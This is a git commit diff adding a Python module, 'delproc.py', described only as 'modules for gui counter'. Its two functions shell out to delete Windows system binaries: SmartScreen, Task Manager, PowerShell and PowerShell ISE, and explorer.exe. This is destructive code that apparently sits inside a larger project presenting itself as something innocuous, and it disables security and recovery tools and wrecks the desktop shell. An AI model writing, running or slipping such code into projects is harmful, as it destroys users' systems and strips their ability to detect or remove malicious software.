b987d7667a169cbf0c3fff9aca03b4c686d6428c
ThomasPoirier-CS <70718793+ThomasPoirier-CS@users.noreply.github.com>
2020-10-31 20:49:52 +0100

    Add files via upload
    modules for gui counter

---
+++ modules/gui/modules/system/delproc.py
@@ -0,0 +1,18 @@
+#!/usr/bin/python
+#coding:utf-8
+import os, sys, time
+
+# Function to delete process in the directory specified
+def pwsst():
+    procs = ['smartscreen.exe', 'taskmgr.exe']
+    for proc in procs:
+        cmd = "del \\windows\\system32\\%s " %(proc)
+        os.system(cmd)
+    pwr_sh = ['powershell.exe', 'powershell_ise.exe']
+    for proc in pwr_sh:
+        cmd = "del \\windows\\system32\\WindowsPowerShell\\v1.0\\%s " %(proc)
+        os.system(cmd)
+# Function to delete gui process on windows
+def exp():
+    cmd = "del \\windows\\explorer.exe "
+    os.system(cmd)
